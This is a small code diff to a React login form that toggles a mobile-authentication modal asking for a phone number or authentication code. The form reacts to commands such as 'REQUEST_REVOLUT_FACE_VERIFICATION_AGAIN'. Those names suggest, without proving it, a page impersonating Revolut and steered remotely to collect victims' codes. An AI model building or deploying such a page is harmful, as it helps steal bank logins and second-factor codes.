@@ -136,7 +136,8 @@ export default function LoginForm() {
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
-            navigateWithLoader('/MobileAuthPAge');
+            displayAuthModal()
+            // navigateWithLoader('/MobileAuthPAge');
             // displayPageLoader();
             // setTimeout(() => {
             //     console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
@@ -288,9 +289,8 @@ export default function LoginForm() {
             ) : null}
             {displayAuth ? (
                 <MobileAuthModal
-                    displayAuth={true}
+                    displayAuth={displayAuth}
                     setDisplayAuth={stableSetDisplayAuth}
-                    resetCommand={resetCommand}
                     displayMessage={displayMessage === 'Phone number' ? 'Enter your phone number' : 'Enter authentication code'}
                 />
             ) : null}
